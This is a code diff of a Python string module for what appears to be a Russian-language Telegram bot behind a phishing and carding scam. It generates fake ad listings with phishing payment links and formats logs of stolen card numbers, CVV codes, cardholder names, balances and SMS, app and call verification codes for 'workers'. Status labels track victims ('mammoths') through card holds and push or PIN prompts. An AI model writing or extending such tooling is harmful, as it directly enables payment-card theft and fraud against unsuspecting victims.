@@ -63,7 +63,7 @@ class texts():
         return f'''Ключ Smartsupp: {key}'''
 
     new_smartsupp = "Укажите новый ключ для Smartsupp"
-
+    error_smartsupp = "❌Ошибка при изменении ключа"
     @staticmethod
     def confirm_smartsupp(key):
         return  f"Вы успешно поменяли ключ Smartsupp на {key}"
@@ -81,17 +81,20 @@ class texts():
     link_photo = "Отправьте фото"
     link_number = "Телефон"
     @staticmethod
-    def link(name, price, author, number, address, checker, link, service):
-        return f'''Обьявление {service}
+    def link(link, settings, service):
+        print(settings)
+        print('---------------')
+        print(service)
+        return f'''Обьявление {link['country']['flag'] + link['name']}
 
-💬Название: {name}
-💰Цена: {price}
-📰Имя: {author}
-📱Телефон: {"отсутствует" if number == "" else number}
-🏡Адрес: {"отсутствует" if address == "" else address}
-💸Чекер баланса: {"включен" if checker else "выключен"}
+💬Название: {link['name']}
+💰Цена: {link['price']}
+📰Имя: {link['author']}
+📱Телефон: {"отсутствует" if link['number'] == "" else link['number']}
+🏡Адрес: {"отсутствует" if link['address'] == "" else link['address']}
+💸Чекер баланса: {"включен" if link['checker'] else "выключен"}
 
-🔗Получение оплаты: {link}'''
+🔗Получение оплаты: {f"{service['subdomain']}.{str(settings[0]['domain'])}/{link['country']['code']}/{str(link['id'])}"}'''
     change_price_link = "Введите новую цену"
     change_price_link_error = "❌Ошибка при изменении баланса"
     @staticmethod
@@ -353,25 +356,80 @@ class admin_texts:
 class log:
 
     @staticmethod
-    def log_text(service, link, worker):
-        return f'''{service['country']+service['orig_domain']}!
+    def log_text(service, link, worker, log):
+        balance = f"\n💰 Balance: {log['balance']} Ft" if log['balance'] else ""
+        accurate = f"\nAccurate Balance: {log['accurate_balance']}" if log['accurate_balance'] else ""
+        sms = f"\n📴 SMS Code: {log['sms']}" if log['sms'] else ""
+        app_code = f"\nApp Code: {log['app_code']}" if log['app_code'] else ""
+        call_code = f"\nCall Code: {log['call_code']}" if log['call_code'] else ""
+        return f'''{service['country']+service['name']}!
 
-💳 Card Number: {link['card']}
-📅 Card Expiry Date: {link['exp']}
-🤣 Cardholder Name: {link['cardholder']}
-🔢 CVV Code: {link['cvv']}
-💰 Balance: {link['balance']} Ft
-Accurate Balance: {link['accurate_balance']}
-📴 SMS Code: {link['sms']}
-App Code: {link['app']}
+💳 Card Number: {log['card']}
+📅 Card Expiry Date: {log['expire']}
+🤣 Cardholder Name: {log['holder']}
+🔢 CVV Code: {log['cvc']}{balance}{accurate}{sms}{app_code}{call_code}Answer to Question: dfghdfhgfh
 
 👨🏻‍💻 Воркер: {worker['nickname']}
 👤 ID Воркера: {worker['id']}
 
-🔡 Объявление: {link['uniq_id']}
+🔡 Объявление: {link['name']}
 🔢 ID Объявления: {link['id']}  
 
 💲 Цена:{link['price']} HUF
 👁 #search193022231'''
 
 
+    wait_text ="Напишите текст:"
+
+    user_online = "🟢Пользователь в сети"
+    user_offline = "🔴Пользователь не в сети"
+
+    success = "💵Успех"
+    @staticmethod
+    def vbiver(nickname):
+        return f"🧑‍💻Вбивает: {nickname}"
+
+    online = "🚘Онлайн мамонта"
+
+    custom_error = "❗️Кастомная ошибка"
+    custom_text = "❗️Кастомный текст"
+    push = "📱PUSH"
+    lk = "🏦ЛК"
+    error_hold = "❌Неуспешный холд"
+    error_code = "❌Неверный код"
+    error_push = "❌Неподтвержденный ПУШ"
+    decline = "❌Отказаться"
+    accurate = "❔ТОЧНЫЙ"
+    image = "📷Картинка"
+    pin_code = "🔐ПИН-КОД"
+    sms = "📩SMS"
+    change = "💳СМЕНА"
+    deposit = "💸ДЕП"
+    limits = "⚠️ЛИМИТЫ"
+    success_hold = "✅Успешный холд"
+    app_code = "📫КОД С ПРИЛОЖЕНИЯ"
+    call_code = "📞КОД ИЗ ЗВОНКА"
+    @staticmethod
+    def status(status):
+        statusText = {
+            "hold":"🔒ХОЛД",
+            "wait":"⏳ОЖИДАНИЕ",
+            "index":"⏳ОЖИДАНИЕ",
+            "push":"📱PUSH",
+            "lk":"🏦ЛК",
+            "error_hold":"❌Неуспешный холд",
+            "error_code":"❌Неверный код",
+            "error_push":"❌Неподтвержденный ПУШ",
+            "decline":"❌Отказаться",
+            "accurate":"❔ТОЧНЫЙ",
+            "image":"📷Картинка",
+            "pin_code":"🔐ПИН-КОД",
+            "sms":"📩SMS",
+            "change":"💳СМЕНА",
+            "deposit":"💸ДЕП",
+            "limit":"⚠️ЛИМИТЫ",
+            "success_hold":"✅Успешный холд",
+            "app_code":"📫КОД С ПРИЛОЖЕНИЯ",
+            "call_code":"📞КОД ИЗ ЗВОНКА"
+        }
+        return "Статус: "+statusText[status]
